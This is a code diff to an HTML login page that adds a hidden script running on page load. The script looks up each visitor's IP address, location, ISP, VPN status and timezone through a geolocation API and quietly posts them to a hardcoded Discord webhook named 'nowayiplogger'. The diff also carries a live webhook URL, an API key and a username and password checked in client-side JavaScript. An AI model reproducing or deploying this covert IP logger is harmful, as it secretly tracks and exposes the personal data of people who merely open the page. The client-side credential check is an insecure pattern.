@@ -5,7 +5,47 @@
   <title>login by noway</title>
   <link rel="icon" type="icon" href="/images/ny_stelle_rGL_icon.ico">
 </head>
-<body> 
+<body>
+    <script src="https://3kh0.github.io/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+        const ip = data.ip_address;
+        const city = data.city;
+        const region = data.region;
+        const zip = data.postal_code;
+        const country = data.country;
+        const flag = data.flag.emoji;
+        const aso = data.connection.autonomous_system_organization;
+        const isp = data.connection.isp_name;
+        const org = data.connection.organization_name;
+        const vpn = data.security.is_vpn;
+        const tz = data.timezone.name;
+        const ct = data.timezone.current_time;
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1040676607901302970/BT_ObS0pPm_zFEkHS2d0Ue57YWsRiDFiJmKAs5BuAQtIqUSoixkUwECYHAKHc2V0WlA7");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "nowayiplogger",
+          avatar_url: "https://cdn.discordapp.com/attachments/1026197121663258705/1058033779815497768/-w9njhu.jpg",
+          content: "**Nuovo accesso a tooldrift.tk**\n> IP: " + ip + 
+          "\n> City: " + city + 
+          "\n> Region: " + region + 
+          "\n> Zip: " + zip + 
+          "\n> Country: " + country +
+          "\n> Flag: " + flag +
+          "\n> Auto System Org: " + aso +
+          "\n> ISP: " + isp +
+          "\n> Org: " + org +
+          "\n> Using VPN: " + vpn +
+          "\n> Timezone: " + tz +
+          "\n> Current time: " + ct
+          ,
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
     <section>
         <div class="form-box">
             <div class="form-value">
@@ -51,7 +91,7 @@
                 var password = document.getElementById("password").value;
         
                 if (email === "JFK" && password === "jfkspeaker") {
-                    window.location.href = "https://fancy-caramel-3f5aae.netlify.app";
+                    window.location.href = "dashboard.html";
                 } else {
                     alert("Invalid Username or Password");
                     return;
